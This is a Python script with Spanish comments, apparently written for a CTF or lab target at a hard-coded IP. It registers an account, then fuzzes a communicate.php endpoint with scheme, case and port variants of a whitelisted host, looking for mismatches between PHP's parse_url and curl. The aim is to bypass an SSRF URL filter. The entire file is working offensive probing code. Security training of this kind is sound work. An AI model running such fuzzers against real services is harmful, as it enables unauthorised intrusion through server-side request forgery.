#!/usr/bin/env python3
"""
Fuzzing ultra agresivo de URLs buscando cualquier diferencia
entre parse_url y curl
"""
import requests
import random
import string
import itertools

TARGET = "http://94.237.49.23:45329"

def random_string(length=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

session = requests.Session()
username = random_string()
password = random_string()

data = {'name': 'user1', 'username': username, 'password': password}
session.post(f"{TARGET}/register.php", data=data)
session.post(f"{TARGET}/login.php", data={'username': username, 'password': password})

print(f"[*] Usuario: {username}:{password}\n")

# Generar combinaciones de URLs
bases = [
    "http://",
    "https://",
    "HTTP://",
    "hTTp://",
]

hosts = [
    "motherland.com",
    "Motherland.com",
    "MOTHERLAND.COM",
    "motherland.Com",
]

suffixes = [
    "/",
    "",
    ":/",
    ":80/",
    ":80",
    ":/test",
    "/test",
    "?test",
    "#test",
]

combinations = []
for base, host, suffix in itertools.product(bases, hosts, suffixes):
    url = f"{base}{host}{suffix}"
    if url not in combinations:
        combinations.append(url)

print(f"[*] Probando {len(combinations)} combinaciones...\n")

interesting = []

for i, url in enumerate(combinations):
    if i % 10 == 0:
        print(f"[*] Progreso: {i}/{len(combinations)}")
    
    data_req = {
        'url': url,
        'data[test]': 'value'
    }
    
    try:
        resp = session.post(f"{TARGET}/communicate.php", data=data_req, timeout=10)
        
        if "Wrong URL" not in resp.text and "Failed when parsing" not in resp.text:
            if "cURL Error" in resp.text:
                import re
                match = re.search(r'cURL Error: ([^<]+)', resp.text)
                if match:
                    error = match.group(1).strip()
                    if "timed out" not in error.lower() and "Resolving" not in error:
                        interesting.append((url, error))
                        print(f"    [!] {url}: {error[:60]}")
            elif "response" in resp.text.lower():
                interesting.append((url, "Got response"))
                print(f"    [+++] {url}: Got response!")
    except:
        pass

print(f"\n[*] Resultados interesantes: {len(interesting)}")
for url, note in interesting:
    print(f"    {url}: {note}")
